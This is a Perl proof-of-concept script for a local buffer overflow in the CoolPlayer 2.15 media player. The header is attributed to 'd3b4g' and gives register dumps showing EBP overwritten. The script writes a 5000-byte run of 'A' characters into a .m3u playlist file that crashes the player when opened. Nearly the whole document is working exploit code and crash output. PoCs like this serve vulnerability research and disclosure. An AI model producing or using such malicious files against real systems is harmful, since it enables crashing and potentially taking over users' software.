#!/usr/bin/perl
# Founded By :d3b4g
# CoolPlayer2.15 (.M3U) Local Buffer Overflow PoC
# download: http://www.soft32.com/Download/Free/CoolPlayer_215/4-570-1.html
############################################################
##EAX 00000001
##ECX 4ED83DEA
##EDX 00000000 
##EBX 001226D0 ASCII"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
##ESP 00122428
##EBP 41414141 EBP is overwritten
##ESI 00000000
##EDI 00D1F958
##EIP 00409D54 coolplay.00409D54
#############################################################
my $crash="\x41" x 5000;
open(myfile,'>>d3b4g.m3u');
print myfile $crash;
##############################################################